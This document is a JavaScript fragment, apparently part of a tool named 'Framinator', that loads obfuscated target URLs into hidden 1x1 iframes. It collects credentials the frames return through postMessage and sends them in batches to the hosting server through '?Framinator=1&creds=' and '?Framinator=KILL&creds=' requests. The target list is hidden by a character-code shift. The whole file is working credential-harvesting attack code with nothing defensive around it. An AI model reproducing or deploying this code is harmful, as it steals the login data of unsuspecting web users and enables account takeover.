        
        
        var creds = "";
        var thresh = 5;
        var numSlaves = 1;
        var chunkLen = targets.length; 

        if(targets.length > 100){
            numSlaves = 5;
        }else if(targets.length > 50){
            numSlaves = 4;
        }else if(targets.length > 25){
            numSlaves = 3;
        }else if(targets.length > 10){
            numSlaves = 2;
        }
     
        if(numSlaves >1 ){
            chunkLen = Math.ceil(targets.length / numSlaves);
        }

        var targetIndexArray = new Array(numSlaves);
        var finishedSlaves = 0;
       
        for(var i=0; i<numSlaves;i++){
            targetIndexArray[i] = i*chunkLen;
        }
        
     
        function deobfs(string)
        {

            var deobfs = "";
            nums = string.split(".")
            
            for (i=0; i<nums.length; i+=1)
            {
                k = parseInt(nums[i])-255
                deobfs+=String.fromCharCode(k);
            }
            return deobfs;
         }


        function createSlaveFrame(slaveFrameNum) 
        { 

            slaveFrame = document.createElement("IFRAME"); 

            if (slaveFrameNum == -1){ 
                d_src = "http://"+document.location.hostname+"?Framinator=NOTHING"           
            }else{
                src = targets[targetIndexArray[slaveFrameNum]];
                d_src = deobfs(src);
                targetIndexArray[slaveFrameNum] += 1;
            }

            slaveFrame.setAttribute("src", d_src); 
            slaveFrame.setAttribute("height", "1");
            slaveFrame.setAttribute("width", "1");
            slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
            slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
            document.body.appendChild(slaveFrame); 

        } 

        function init() 
        {
            if (window.addEventListener) 
            {  // all browsers except IE before version 9
                window.addEventListener ("message", OnMessage, false);
            }
            else 
            {
                if (window.attachEvent) 
                {   // IE before version 9
                    window.attachEvent("onmessage", OnMessage);
                }
            }
          
                     
            for(var j=-1;j<numSlaves;j+=1){
                  createSlaveFrame(j);

            }
        }

       
           
        function OnMessage (event) 
        {
            var message = event.data;
            var ef_chunkLen = chunkLen;
            var cash = message.indexOf("$$$");
            var slaveFrameName = message.substring(0,cash);
            var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
            var slaveFrameNum = parseInt(slaveFrameName.substring(10));

            message = message.substring(cash+3);
            var arr = message.split(",");

            if (message != "") 
            {
                creds+="|"+arr[0]+"|"+arr[1]+"|"+arr[2]+"|||||";
            }
         

            
            if( targetIndexArray[slaveFrameNum] < targets.length && 
                targetIndexArray[slaveFrameNum] < slaveFrameNum*chunkLen+chunkLen)
            {
                src = targets[targetIndexArray[slaveFrameNum]];
                d_src = deobfs(src);
                targetIndexArray[slaveFrameNum] +=1;

                slaveFrame.setAttribute('src', d_src );
            }else
            {
                finishedSlaves+=1;
                //document.body.removeChild(slaveFrameName);

            }


            var cut = creds.lastIndexOf("|||||");
            if(finishedSlaves == numSlaves)
            {
               if(cut > -1) 
               {     
                   src = "http://"+document.location.hostname+"?Framinator=KILL&creds=";          
                   document.location.replace(src+creds.substring(0,cut));               
               }else
               {
                   src = "http://"+document.location.hostname+"?Framinator=KILL";
                   document.location.replace(src)
               }
            }else
            {   

               credCount = creds.split("|||||").length - 1;
               if(credCount == thresh) 
               {   
                   //alert(creds+"\n"+creds.substring(0,cut));

                   src = "http://"+document.location.hostname+"?Framinator=1&creds=";
                   sendFrame = document.getElementsByName("slaveFrame-1")[0];
                   sendFrame.setAttribute('src',src+creds.substring(0,cut));               
                   creds = "";
               }
            }  
        }   